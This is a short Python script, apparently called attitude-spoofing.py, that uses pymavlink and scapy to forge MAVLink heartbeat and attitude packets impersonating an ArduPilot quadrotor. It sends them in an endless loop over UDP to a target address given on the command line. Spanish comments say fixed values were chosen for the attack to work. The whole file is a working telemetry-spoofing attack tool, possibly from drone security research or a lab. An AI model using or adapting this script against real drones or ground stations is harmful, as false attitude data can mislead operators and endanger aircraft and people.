from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
		    # Estos son los parametros que venia por defecto en el script
        #time_boot_ms=int(time.time() * 1e3) % 4294967295,
        #roll=random.uniform(-1.0, 1.0),
        #pitch=random.uniform(-1.0, 1.0),
        #yaw=random.uniform(-3.14, 3.14),
        #rollspeed=random.uniform(-0.1, 0.1),
        #pitchspeed=random.uniform(-0.1, 0.1),
        #yawspeed=random.uniform(-0.1, 0.1)
        
        # Parametros fijos para la correcta elaboracion del ataque
        time_boot_ms= 15256,
        roll=5.5,
        pitch=5.6,
        yaw=5.7,
        rollspeed=5.8,
        pitchspeed=5.9,
        yawspeed=6.0
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attitude-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_attitude(), target_ip, target_port)
        print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
